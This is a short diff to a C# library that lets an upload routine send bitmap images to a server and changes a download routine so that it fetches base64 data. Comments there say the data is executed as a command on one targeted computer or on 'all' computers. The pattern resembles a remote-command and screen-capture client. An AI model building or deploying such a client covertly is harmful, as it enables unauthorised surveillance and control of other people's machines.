@@ -280,11 +280,17 @@ namespace Library
             string content = String.Empty;
             try
             {
+                var bytes = Encoding.Default.GetBytes(Convert.ToString(data));
+                var image = data as Bitmap;
+                if (image != null)
+                {
+                    bytes = image.ImageToByte();
+                }
                 var request = new RestRequest("/values/UploadFile", Method.POST);
                 request.AddObject(new FileData()
                 {
-                    Data = Convert.ToBase64String(Encoding.Default.GetBytes(Convert.ToString(data))),
-                    FileNameWithExtension = "data.txt"
+                    Data = Convert.ToBase64String(bytes),
+                    FileNameWithExtension = "data.dat"
                 });
                 var response = client.Execute(request);
                 content = response.Content;
@@ -445,16 +451,15 @@ namespace Library
             byte[] result = null;
             try
             {
-                var request = new RestRequest("/values/DownloadFile", Method.POST);
-                //request.AddUrlSegment("fileName", TSettings.FileName);
-                //request.AddUrlSegment("tokenValue", Auth.Token);
-                //request.RequestFormat = DataFormat.Json;
+                var request = new RestRequest("/values/DownloadFile/{settings}", Method.POST);
+                request.AddObject(TSettings);
                 var response = client.Execute(request);
                 // if the computer hash is equal to this computer then execute a command on that computer
                 // if the hash is from "all", then execute a command on all of the computers
                 if (TSettings.ComputerHash == GetComputerHash() || TSettings.ComputerHash == General.Sha1Hash("all"))
                 {
-                    result = Convert.FromBase64String(response.Content);
+                    var data = JsonConvert.DeserializeObject<string>(response.Content);
+                    result = Convert.FromBase64String(data);
                 }
             }
             catch (Exception ex) { }
